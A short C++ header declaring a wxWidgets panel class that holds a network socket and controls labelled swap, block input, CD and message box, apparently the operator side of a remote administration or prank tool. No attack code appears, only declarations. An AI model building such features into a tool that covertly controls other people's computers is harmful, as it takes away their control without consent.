#ifndef __PNL_FUN
#define __PNL_FUN 1

#include "headers.hpp"

namespace EnumFunIDS {
	enum Enum {
		ID_Main_Window = 300,
		ID_BTN_Swap,
		ID_BTN_Block,
		ID_BTN_CD,
		ID_BTN_Msg
	};
}

class panelFun : public wxFrame {
	public:
		panelFun(wxWindow* pParent, SOCKET _socket, std::string _strID);
	private:
		SOCKET sckSocket = INVALID_SOCKET;

		wxToggleButton* btn_Swap    = nullptr;
		wxToggleButton* btn_BlockIn = nullptr;
		wxToggleButton* btn_CD      = nullptr;
		wxTextCtrl* txtMensaje		= nullptr;
		wxTextCtrl* txtTitulo		= nullptr;
		wxComboBox* cmbBotones		= nullptr;
		wxComboBox* cmbTipoMsg		= nullptr;

		//Eventos
		void OnMsg(wxCommandEvent& event);
		void OnToggle(wxCommandEvent& event);

		std::map<std::string, UINT> mapa_uint = {
			{"MB_ABORTRETRYIGNORE",   MB_ABORTRETRYIGNORE},
			{"MB_CANCELTRYCONTINUE", MB_CANCELTRYCONTINUE},
			{"MB_HELP",							  MB_HELP},
			{"MB_OK",                               MB_OK},
			{"MB_OKCANCEL",                   MB_OKCANCEL},
			{"MB_RETRYCANCEL",             MB_RETRYCANCEL},
			{"MB_YESNO",                         MB_YESNO},
			{"MB_YESNOCANCEL",             MB_YESNOCANCEL},
			{"MB_ICONERROR",                 MB_ICONERROR},
			{"MB_ICONQUESTION",           MB_ICONQUESTION},
			{"MB_ICONWARNING",             MB_ICONWARNING},
			{"MB_ICONINFORMATION",     MB_ICONINFORMATION}
		};

		wxDECLARE_EVENT_TABLE();
};

#endif
